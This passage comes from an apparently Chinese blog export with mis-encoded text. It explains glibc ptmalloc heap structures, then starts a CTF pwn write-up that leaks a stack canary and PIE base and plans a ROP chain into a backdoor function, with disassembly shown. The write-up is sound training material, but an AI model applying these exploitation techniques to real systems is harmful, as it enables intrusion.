‡å¿—ä½</p><ul><li>NON_MAIN_ARENAï¼Œè®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹ï¼Œ1 è¡¨ç¤ºä¸å±äºï¼Œ0 è¡¨ç¤ºå±äºã€‚ &#x3D;&#x3D;A&#x3D;&#x3D;</li><li>IS_MAPPEDï¼Œè®°å½•å½“å‰ chunk æ˜¯å¦æ˜¯ç”± mmap åˆ†é…çš„ã€‚ free_chunkçš„å§‹ç»ˆä¸º0 &#x3D;&#x3D;M&#x3D;&#x3D;</li><li>PREV_INUSEï¼Œè®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² chunk ä¹‹é—´çš„åˆå¹¶ã€‚&#x3D;&#x3D;P&#x3D;&#x3D;</li></ul></blockquote></li></ul></li><li><p>fd bk</p><blockquote><p>allocatedçŠ¶æ€ä¸‹ä»è¿™é‡Œå¼€å§‹ä¸ºç”¨æˆ·æ•°æ®åŒºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€šå¸¸è¯´çš„mallocè¿”å›ç»™ç”¨æˆ·çš„åœ°å€å°±æ˜¯ä»è¿™é‡Œå¼€å§‹çš„ï¼ŒfreeçŠ¶æ€ä¸‹ä¼šè¢«æ·»åŠ åˆ°å¯¹åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­</p><p>fd æŒ‡å‘ä¸‹ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk</p><p>bk æŒ‡å‘ä¸Šä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk</p><p><code>fd</code>å’Œ<code>bk</code>æ˜¯<code>forward</code>å’Œ<code>backward</code>çš„ç¼©å†™ã€‚</p></blockquote></li><li><p>fd_nextsize bk_nextsize</p><ul><li><blockquote><p>freeæ—¶ä½¿ç”¨ï¼Œç”¨äºlarge chunk</p><p>fd_nextsize æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚</p><p>bk_nextsize æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚</p><p>ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚<strong>è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†ã€‚</strong></p></blockquote></li></ul></li></ul><p><strong>ä¸€èˆ¬æƒ…å†µä¸‹</strong>ï¼Œç‰©ç†ç›¸é‚»çš„ä¸¤ä¸ªç©ºé—² chunk ä¼šè¢«åˆå¹¶ä¸ºä¸€ä¸ª chunk ã€‚å †ç®¡ç†å™¨ä¼šé€šè¿‡ prev_size å­—æ®µä»¥åŠ size å­—æ®µåˆå¹¶ä¸¤ä¸ªç‰©ç†ç›¸é‚»çš„ç©ºé—² chunk å—ã€‚</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>ç”¨æˆ·é‡Šæ”¾æ‰çš„ chunk ä¸ä¼šé©¬ä¸Šå½’è¿˜ç»™ç³»ç»Ÿï¼Œä¼šæ”¾å…¥binæˆ–è€…åˆå¹¶åˆ°top chunkä¸­å»,ptmalloc ä¼šç»Ÿä¸€ç®¡ç† heap å’Œ mmap æ˜ å°„åŒºåŸŸä¸­çš„ç©ºé—²çš„ chunkã€‚å½“ç”¨æˆ·å†ä¸€æ¬¡è¯·æ±‚åˆ†é…å†…å­˜æ—¶ï¼Œptmalloc åˆ†é…å™¨ä¼šè¯•å›¾åœ¨ç©ºé—²çš„ chunk ä¸­æŒ‘é€‰ä¸€å—åˆé€‚çš„ç»™ç”¨æˆ·ã€‚è¿™æ ·å¯ä»¥é¿å…é¢‘ç¹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé™ä½å†…å­˜åˆ†é…çš„å¼€é”€ã€‚&#x3D;&#x3D;mmapç”³è¯·é‡Šæ”¾æ—¶ç›´æ¥å½’è¿˜æ“ä½œç³»ç»Ÿ ä¸è¿›å…¥bin&#x3D;&#x3D;</p><p>ptmalloc2ç»´æŠ¤binsæ•°ç»„</p><p>æ ¹æ®ç©ºé—²çš„ chunk çš„å¤§å°ä»¥åŠä½¿ç”¨çŠ¶æ€å°† chunk åˆæ­¥åˆ†ä¸º 4 ç±»ï¼šfast bins(å°)ï¼Œsmall bins(ä¸­)ï¼Œlarge binsï¼ˆå¤§ï¼‰ï¼Œunsorted binï¼ˆæœªæ•´ç†ï¼‰ã€‚</p><ol><li>ç¬¬ä¸€ä¸ªä¸º unsorted binï¼Œå­—å¦‚å…¶é¢ï¼Œè¿™é‡Œé¢çš„ chunk æ²¡æœ‰è¿›è¡Œæ’åºï¼Œå­˜å‚¨çš„ chunk æ¯”è¾ƒæ‚ã€‚</li><li>ç´¢å¼•ä» 2 åˆ° 63 çš„ bin ç§°ä¸º small binï¼ŒåŒä¸€ä¸ª small bin é“¾è¡¨ä¸­çš„ chunk çš„å¤§å°ç›¸åŒã€‚ä¸¤ä¸ªç›¸é‚»ç´¢å¼•çš„ small bin é“¾è¡¨ä¸­çš„ chunk å¤§å°ç›¸å·®çš„å­—èŠ‚æ•°ä¸º <strong>2 ä¸ªæœºå™¨å­—é•¿</strong>ï¼Œå³ 32 ä½ç›¸å·® 8 å­—èŠ‚ï¼Œ64 ä½ç›¸å·® 16 å­—èŠ‚ã€‚</li><li>small bins åé¢çš„ bin è¢«ç§°ä½œ large binsã€‚large bins ä¸­çš„æ¯ä¸€ä¸ª bin éƒ½åŒ…å«ä¸€å®šèŒƒå›´å†…çš„ chunkï¼Œå…¶ä¸­çš„ chunk æŒ‰ fd æŒ‡é’ˆçš„é¡ºåºä»å¤§åˆ°å°æ’åˆ—ã€‚ç›¸åŒå¤§å°çš„ chunk åŒæ ·æŒ‰ç…§æœ€è¿‘ä½¿ç”¨é¡ºåºæ’åˆ—ã€‚</li></ol><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>malloc state ä¸­çš„ fastbinsY[]</p><table><thead><tr><th>fastbinsY[]</th><th>x86ï¼ˆsize_t&#x3D;4ï¼‰</th><th>x64ï¼ˆsize_t&#x3D;8ï¼‰</th></tr></thead><tbody><tr><td>0</td><td>0x10</td><td>0x20</td></tr><tr><td>1</td><td>0x18</td><td>0x30</td></tr><tr><td>2</td><td>0x20</td><td>0x40</td></tr><tr><td>3</td><td>0x28</td><td>0x50</td></tr><tr><td>4</td><td>0x30</td><td>0x60</td></tr><tr><td>5</td><td>0x38</td><td>0x70</td></tr><tr><td>6</td><td>0x40</td><td>0x80</td></tr></tbody></table><ol><li>ptmalloc2 ä¸ºäº†æé«˜åˆ†é…çš„é€Ÿåº¦ï¼Œä¼šæŠŠä¸€äº›å°çš„ chunk <strong>å…ˆ</strong>æ”¾åˆ° fast bins çš„å®¹å™¨å†…,fast bins Pä½å§‹ç»ˆä¸º1ï¼Œä¸åˆå¹¶ç‰©ç†ç›¸é‚»çš„chunk</li><li>æ˜¯ä¸ªå•é“¾è¡¨ç»“æ„ï¼Œåªæ˜¯ç”¨fdæˆå‘˜</li><li>ç”¨æˆ·ç”³è¯·chunkå¤§å°&lt;&#x3D;MAX_FAST_SIZEæ—¶ï¼Œä¼˜å…ˆä»fastbinsæŸ¥æ‰¾ç©ºé—²å—ï¼ŒLIFOè§„åˆ™ï¼Œæ»¡è¶³é¢‘ç¹çš„ç”³è¯·å’Œé‡Šæ”¾åŒä¸€å—chunkï¼Œæ»¡è¶³å±€éƒ¨æ€§</li><li>ptmalloc é»˜è®¤æƒ…å†µä¸‹ä¼šè°ƒç”¨ set_max_fast(s) å°†å…¨å±€å˜é‡ global_max_fast è®¾ç½®ä¸º DEFAULT_MXFASTï¼Œä¹Ÿå°±æ˜¯è®¾ç½® fast bins ä¸­ chunk çš„æœ€å¤§å€¼ã€‚å½“ MAX_FAST_SIZE è¢«è®¾ç½®ä¸º 0 æ—¶ï¼Œç³»ç»Ÿå°±ä¸ä¼šæ”¯æŒ fastbin ã€‚</li><li><img src="/2023/02/25/23-2-25-heap/image-20230225144619435.png" alt="image-20230225144619435" style="zoom:50%;"></li></ol><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><ol><li>å¯ä»¥è§†ä¸ºç©ºé—² chunk å›å½’å…¶æ‰€å± bin ä¹‹å‰çš„ç¼“å†²åŒºï¼Œåˆšåˆšè¢«é‡Šæ”¾ï¼Œè¿˜æœªåˆ†ç±»çš„chunkã€‚bin[1]</li><li>FIFOçš„åŒå‘é“¾è¡¨ï¼Œå½“æ‰§è¡Œ<code>free()</code>å‡½æ•°æ—¶ï¼Œå†…å­˜åˆ†é…å™¨ä¼šæ ¹æ®é‡Šæ”¾çš„å†…å­˜å—çš„å¤§å°ï¼Œå°†å®ƒä»¬æ”¾ç½®åˆ°ä¸åŒçš„å†…å­˜å—é“¾è¡¨ä¸­ã€‚å¯¹äºå°äºç­‰äº<code>FASTBIN_MAX_SIZE</code>çš„å†…å­˜å—ï¼Œå®ƒä»¬ä¼šè¢«æ”¾ç½®åˆ°<code>fastbin</code>ä¸­ï¼Œè€Œå¯¹äºå¤§äº<code>FASTBIN_MAX_SIZE</code>çš„å†…å­˜å—ï¼Œåˆ™ä¼šè¢«æ”¾ç½®åˆ°<code>unsorted bin</code>ä¸­ã€‚å­˜æ”¾æœªè¢«æ•´ç†çš„ chunk</li><li>mallocæ—¶ï¼Œå†…å­˜åˆ†é…å™¨é¦–å…ˆä¼šå°è¯•ä»<code>fastbin</code>ä¸­åˆ†é…ç©ºé—²å†…å­˜å—ï¼Œå½“åˆ†é…å™¨éœ€è¦åˆ†é…å¤§äº<code>FASTBIN_MAX_SIZE</code>çš„å†…å­˜æ—¶ï¼Œå®ƒä¼šå°è¯•ä»<code>unsorted bin</code>ä¸­åˆ†é…å†…å­˜å—ã€‚å¦‚æœåˆ†é…å™¨å‘ç°<code>unsorted bin</code>ä¸­æœ‰é€‚åˆå¤§å°çš„ç©ºé—²å—ï¼Œå®ƒå°†é€‰æ‹©å…¶ä¸­ä¸€ä¸ªï¼Œå¹¶è¿”å›ç»™åº”ç”¨ç¨‹åºã€‚å¦‚æœæ²¡æœ‰é€‚åˆçš„ç©ºé—²å—ï¼Œåˆ™åˆ†é…å™¨ä¼šå°†<code>unsorted bin</code>ä¸­çš„ç©ºé—²å—åˆå¹¶ï¼Œå¹¶å°†åˆå¹¶åçš„å¤§å—æ·»åŠ åˆ°<code>large bin</code>ä¸­ã€‚ä¼šä¾æ¬¡æŸ¥æ‰¾<code>small bin</code>ã€<code>large bin</code>ã€<code>mmapped</code>ç­‰å…¶ä»–å†…å­˜å—ï¼Œç›´åˆ°æ‰¾åˆ°åˆé€‚çš„å†…å­˜å—ã€‚</li><li><img src="/2023/02/25/23-2-25-heap/image-20230225150843293.png" alt="image-20230225150843293" style="zoom:50%;"></li></ol><h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><p>size&#x3D; 2* size_sz * index</p><table><thead><tr><th align="left">ä¸‹æ ‡</th><th align="left">SIZE_SZ&#x3D;4ï¼ˆ32 ä½ï¼‰</th><th align="left">SIZE_SZ&#x3D;8ï¼ˆ64 ä½ï¼‰</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">16</td><td align="left">32</td></tr><tr><td align="left">3</td><td align="left">24</td><td align="left">48</td></tr><tr><td align="left">4</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">5</td><td align="left">40</td><td align="left">80</td></tr><tr><td align="left">x</td><td align="left">2*4*x</td><td align="left">2*8*x</td></tr><tr><td align="left">63</td><td align="left">504</td><td align="left">1008</td></tr></tbody></table><ol><li>æ¯ä¸ªé“¾è¡¨ä¸­å­˜å‚¨çš„ chunk å¤§å°éƒ½ä¸€è‡´</li><li>å¾ªç¯åŒå‘é“¾è¡¨ï¼Œæ¯ä¸ªé“¾è¡¨éƒ½æœ‰é“¾è¡¨å¤´ç»“ç‚¹</li><li><strong>small bins ä¸­æ¯ä¸ª bin å¯¹åº”çš„é“¾è¡¨é‡‡ç”¨ FIFO çš„è§„åˆ™</strong></li><li>é‡Šæ”¾çš„æ—¶å€™ä¼šæ£€æŸ¥ç›¸é‚»çš„æ˜¯ä¸æ˜¯freeçš„ï¼Œå¦‚æœæ˜¯è¿›è¡Œåˆå¹¶ç„¶åæ”¾åˆ° unsortedbin</li><li><img src="/2023/02/25/23-2-25-heap/image-20230225151846846.png" alt="image-20230225151846846" style="zoom:50%;"></li></ol><h3 id="large-Bin"><a href="#large-Bin" class="headerlink" title="large Bin"></a>large Bin</h3><ol><li><p>bins[64] ~ bins[126] </p></li><li><p>å¾ªç¯åŒå‘é“¾è¡¨ FIFO</p></li><li><p>è¿™ 63 ä¸ª bin è¢«åˆ†æˆäº† 6 ç»„ï¼Œæ¯ç»„ bin ä¸­çš„ chunk å¤§å°ä¹‹é—´çš„å…¬å·®ä¸€è‡´ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="left">ç»„</th><th align="left">æ•°é‡</th><th align="left">å…¬å·®</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">ä¸é™åˆ¶</td></tr></tbody></table></li><li><img src="/2023/02/25/23-2-25-heap/image-20230225152540343.png" alt="image-20230225152540343" style="zoom: 67%;"></li></ol><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>ä¸€èˆ¬ç”³è¯·çš„ heap æ˜¯ä¸è¿ç»­çš„ï¼Œå› æ­¤éœ€è¦è®°å½•ä¸åŒ heap ä¹‹é—´çš„é“¾æ¥ç»“æ„ã€‚</p><p>è¯¥æ•°æ®ç»“æ„æ˜¯ä¸“é—¨ä¸ºä» Memory Mapping Segment å¤„ç”³è¯·çš„å†…å­˜å‡†å¤‡çš„ï¼Œå³ä¸ºéä¸»çº¿ç¨‹(mmapç”³è¯·)å‡†å¤‡çš„ã€‚</p><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>è¯¥ç»“æ„ç”¨äºç®¡ç†å †ï¼Œè®°å½•æ¯ä¸ª arena å½“å‰ç”³è¯·çš„å†…å­˜çš„å…·ä½“çŠ¶æ€ï¼Œæ¯”å¦‚è¯´æ˜¯å¦æœ‰ç©ºé—² chunkï¼Œæœ‰ä»€ä¹ˆå¤§å°çš„ç©ºé—² chunk ç­‰ç­‰ã€‚æ— è®ºæ˜¯ thread arena è¿˜æ˜¯ main arenaï¼Œå®ƒä»¬éƒ½åªæœ‰ä¸€ä¸ª malloc state ç»“æ„ã€‚ä¼šåœ¨æœ€æ–°ç”³è¯·çš„arenaä¸­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="åˆ†é…å’Œé‡Šæ”¾è¿‡ç¨‹"><a href="#åˆ†é…å’Œé‡Šæ”¾è¿‡ç¨‹" class="headerlink" title="åˆ†é…å’Œé‡Šæ”¾è¿‡ç¨‹"></a><a href="https://blog.csdn.net/sinat_19596835/article/details/81665095">åˆ†é…å’Œé‡Šæ”¾è¿‡ç¨‹</a></h2><p><img src="/2023/02/25/23-2-25-heap/image-20230805140153900.png" alt="image-20230805140153900"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HEAP MANGER </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‡ ç»å‘¨æŠ˜rop</title>
      <link href="/2023/02/16/23-2-16/"/>
      <url>/2023/02/16/23-2-16/</url>
      
        <content type="html"><![CDATA[<p>ä¿¡å·ä¸ç³»ç»Ÿå®åœ¨å¤ä¹ ä¸ä¸‹å»</p><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1_EXQHF0uumBE2tWhloeiNg">https://pan.baidu.com/s/1_EXQHF0uumBE2tWhloeiNg</a><br>æå–ç ï¼š2thf</p><p>æŸå¤§å­¦å†¬ä»¤è¥ï¼Œé¢˜ç›®æœ¬æ¥æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯åˆšå¼€å§‹å‡ºé¢˜æ–¹é¶æœºç¯å¢ƒå¯èƒ½å‡ºç°äº†æŸäº›é—®é¢˜ï¼Œå¯¼è‡´expä¸€ç›´å¯ä»¥æ‰“é€šæœ¬åœ°ï¼Œæ‰“è¿œç¨‹ä¸€ç›´æ‰“ä¸å‡ºflagï¼Œä¹Ÿä¸æ•¢è´¨ç–‘æ˜¯å®˜æ–¹çš„é—®é¢˜ï¼Œä¸€ç›´åœ¨æ”¹è‡ªå·±çš„expï¼Œä¸è¿‡ä¹Ÿå¼•å‘äº†è‡ªå·±çš„ä¸€äº›æ€è€ƒï¼Œå†™å‡ºäº†å¤šç§æ€è·¯ï¼Œæœ€åå®˜æ–¹ä¿®å¤äº†ï¼Œå†™çš„å‡ ä¸ªexpä¹Ÿéƒ½æ‰“é€šäº†</p><span id="more"></span><h2 id="åˆæ¢"><a href="#åˆæ¢" class="headerlink" title="åˆæ¢"></a>åˆæ¢</h2><h4 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h4><p><img src="/2023/02/16/23-2-16/image-20230216230353617.png" alt="image-20230216230353617"></p><h4 id="æŸ¥çœ‹ä¿æŠ¤"><a href="#æŸ¥çœ‹ä¿æŠ¤" class="headerlink" title="æŸ¥çœ‹ä¿æŠ¤"></a>æŸ¥çœ‹ä¿æŠ¤</h4><p><img src="/2023/02/16/23-2-16/image-20230216230425068.png" alt="image-20230216230425068"></p><p>å¥½å®¶ä¼™ä¿æŠ¤å¼€æ»¡äº†</p><h3 id="idaé™æ€åˆ†æ"><a href="#idaé™æ€åˆ†æ" class="headerlink" title="idaé™æ€åˆ†æ"></a>idaé™æ€åˆ†æ</h3><p><img src="/2023/02/16/23-2-16/image-20230216230715969.png" alt="image-20230216230715969"></p><p>å¾ˆå¿«å‘ç°äº†ä¸¤å¤„è¾“å…¥éƒ½æœ‰æ¼æ´å‡½æ•°ç‚¹ï¼Œbufåªæœ‰8byteå®¹é‡ï¼Œå´åˆ†åˆ«è¯»å…¥0x1eå’Œ0x5aï¼Œè¿˜æœ‰åé—¨å‡½æ•°winå˜¿å˜¿</p><p><img src="/2023/02/16/23-2-16/image-20230216230920491.png" alt="image-20230216230920491"></p><p>å¾ˆæ˜æ˜¾ï¼Œåé—¨å‡½æ•°æä¾›ç»™æˆ‘ä»¬ä¼ªé€ æ ˆå¸§çš„ä¾¿åˆ©ï¼Œè¯»å–flag.txtæ–‡ä»¶å¹¶æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯ç¼ºå°‘flaï¼Œé‚£ä¹ˆæ€è·¯å¤§è‡´æœ‰äº†ï¼Œä¼ªé€ æ ˆå¸§å¹¶è¿›è¡Œrop</p><h2 id="è°ƒè¯•å¹¶ç¼–å†™exp"><a href="#è°ƒè¯•å¹¶ç¼–å†™exp" class="headerlink" title="è°ƒè¯•å¹¶ç¼–å†™exp"></a>è°ƒè¯•å¹¶ç¼–å†™exp</h2><ol><li>ç”±äºå¼€å¯äº†canaryä¿æŠ¤ï¼Œæˆ‘éœ€è¦å…ˆæ³„éœ²canaryï¼Œåˆ©ç”¨canaryæœ€lowä¸€ä¸ªbyteæ’ä¸º0ï¼Œä¸”canaryæ’åœ¨push rbpçš„ä¸Šæ–¹ï¼Œbufè·ç¦»rbp0x12&#x3D;18ï¼Œæˆ‘ä»¬æˆ‘ä»¬åªéœ€è¦10byteå°±å¯ä»¥åˆ°canaryï¼Œå†è¦†ç›–canaryæœ€lowä¸€ä¸ªbyteå°±å¯ä»¥åˆ©ç”¨printf(â€œYou said: %s\nâ€, (const char *)&amp;buf);æŠŠcanaryè¾“å‡ºå‡ºæ¥ï¼Œpaylaodä¸ºbâ€™aâ€™*11,æ³„éœ²canaryçš„åŒæ—¶æˆ‘ä»¬ä¹Ÿæ³„éœ²äº†ä¿å­˜çš„rbpï¼Œåé¢ä¼ªé€ æ ˆå¸§æ—¶æœ‰ç”¨ï¼Œæ³„éœ²å®Œä¹‹åæˆ‘ä»¬åœ¨ä¸‹ä¸€æ¬¡readè¦å¡«è¡¥ä¸Šcanaryï¼Œè¿›è¡Œä¸‹ä¸€ä¸‹å¾ªç¯ï¼Œgetfeedback()</li><li>ç”±äºå¼€å¯pieä¿æŠ¤ï¼Œæˆ‘ä»¬è¿˜è¦æ³„éœ²pieåŸºå€</li></ol><p><img src="/2023/02/16/23-2-16/image-20230216234031392.png" alt="image-20230216234031392"></p><p>bâ€™aâ€™*26æ³„éœ²åœ°å€ï¼Œå‡å»elfå¤„æ”¹åœ°å€å³ä¸ºpieåŸºå€ï¼Œè¿™é‡Œä¸ç”¨æ‹…å¿ƒæˆ‘ä»¬ä¼šè¦†ç›–canaryï¼Œcanaryåªæœ‰åœ¨è¯¥å‡½æ•°è¿”å›æ—¶ï¼Œæ‰ä¼šæ£€æµ‹canaryï¼Œ</p><p><img src="/2023/02/16/23-2-16/image-20230216235350781.png" alt="image-20230216235350781"></p><p>ä¸‹é¢è¿˜æœ‰ä¸€æ¬¡readå‡½æ•°ï¼Œè¿™æ¬¡readæˆ‘ä»¬æ„é€ ropé“¾ï¼Œæ¢å¤canary</p><ol start="3"><li>åœ¨æ„é€ å‰æˆ‘ä»¬å…ˆåˆ†æä¸‹win</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winå‡½æ•°æ±‡ç¼–</span><br><span class="line">0x0000555555555249 &lt;+0&gt;:     endbr64 </span><br><span class="line">0x000055555555524d &lt;+4&gt;:     push   rbp</span><br><span class="line">0x000055555555524e &lt;+5&gt;:     mov    rbp,rsp</span><br><span class="line">0x0000555555555251 &lt;+8&gt;:     sub    rsp,0x70</span><br><span class="line">0x0000555555555255 &lt;+12&gt;:    mov    ecx,esi</span><br><span class="line">0x0000555555555257 &lt;+14&gt;:    mov    eax,edx</span><br><span class="line">0x0000555555555259 &lt;+16&gt;:    mov    edx,edi    ;å¾ˆæ­£å¸¸çš„64ä½ç¨‹åºå¯„å­˜å™¨ä¼ å‚ï¼Œå‰6ä¸ªå‚æ•°ä»å·¦å‘å³rdi rsi rdx rcx r8 r9æ²¡åŠæ³•å¹²é¢„</span><br><span class="line">0x000055555555525b &lt;+18&gt;:    mov    BYTE PTR [rbp-0x64],dl    f;è¿™é‡Œå¼€å§‹å¼€å§‹æŠŠæˆ‘ä»¬çš„å‚æ•°å¾€æ ˆä¸Šè½¬ç§»ï¼Œæœ‰å¯ä¹˜ä¹‹æœº,</span><br><span class="line">0x000055555555525e &lt;+21&gt;:    mov    edx,ecx</span><br><span class="line">0x0000555555555260 &lt;+23&gt;:    mov    BYTE PTR [rbp-0x68],dl    l</span><br><span class="line">0x0000555555555263 &lt;+26&gt;:    mov    BYTE PTR [rbp-0x6c],al   a       </span><br><span class="line">0x0000555555555266 &lt;+29&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000055555555526f &lt;+38&gt;:    mov    QWORD PTR [rbp-0x8],rax            </span><br><span class="line">0x0000555555555273 &lt;+42&gt;:    xor    eax,eax</span><br><span class="line">0x0000555555555275 &lt;+44&gt;:    mov    QWORD PTR [rbp-0x4a],0x0    ;å…ˆæŠŠè¿™å‡ ä½ç½®é›¶</span><br><span class="line">0x000055555555527d &lt;+52&gt;:    mov    WORD PTR [rbp-0x42],0x0</span><br><span class="line">0x0000555555555283 &lt;+58&gt;:    movzx  eax,BYTE PTR [rbp-0x64];å‚æ•°è½¬ç§»</span><br><span class="line">0x0000555555555287 &lt;+62&gt;:    mov    BYTE PTR [rbp-0x4a],al    f</span><br><span class="line">0x000055555555528a &lt;+65&gt;:    movzx  eax,BYTE PTR [rbp-0x68]    </span><br><span class="line">0x000055555555528e &lt;+69&gt;:    mov    BYTE PTR [rbp-0x49],al    l</span><br><span class="line">0x0000555555555291 &lt;+72&gt;:    movzx  eax,BYTE PTR [rbp-0x6c]  a;ä»è¿™é‡Œå€’æ¨å³å¯</span><br><span class="line">0x0000555555555295 &lt;+76&gt;:    mov    BYTE PTR [rbp-0x48],al</span><br><span class="line">0x0000555555555298 &lt;+79&gt;:    mov    BYTE PTR [rbp-0x47],0x67        </span><br><span class="line">0x000055555555529c &lt;+83&gt;:    mov    BYTE PTR [rbp-0x46],0x2e</span><br><span class="line">0x00005555555552a0 &lt;+87&gt;:    mov    BYTE PTR [rbp-0x45],0x74</span><br><span class="line">0x00005555555552a4 &lt;+91&gt;:    mov    BYTE PTR [rbp-0x44],0x78</span><br><span class="line">0x00005555555552a8 &lt;+95&gt;:    mov    BYTE PTR [rbp-0x43],0x74</span><br><span class="line">0x00005555555552ac &lt;+99&gt;:    lea    rax,[rbp-0x4a]</span><br><span class="line">0x00005555555552b0 &lt;+103&gt;:   lea    rsi,[rip+0xd51]        # 0x555555556008</span><br><span class="line">0x00005555555552b7 &lt;+110&gt;:   mov    rdi,rax</span><br><span class="line">0x00005555555552ba &lt;+113&gt;:   call   0x555555555140 &lt;fopen@plt&gt;</span><br><span class="line">0x00005555555552bf &lt;+118&gt;:   mov    QWORD PTR [rbp-0x58],rax</span><br><span class="line">0x00005555555552c3 &lt;+122&gt;:   cmp    QWORD PTR [rbp-0x58],0x0</span><br><span class="line">0x00005555555552c8 &lt;+127&gt;:   jne    0x5555555552e0 &lt;win+151&gt;</span><br><span class="line">0x00005555555552ca &lt;+129&gt;:   lea    rdi,[rip+0xd39]        # 0x55555555600a</span><br><span class="line">0x00005555555552d1 &lt;+136&gt;:   call   0x5555555550d0 &lt;puts@plt&gt;</span><br><span class="line">0x00005555555552d6 &lt;+141&gt;:   mov    edi,0x1</span><br><span class="line">0x00005555555552db &lt;+146&gt;:   call   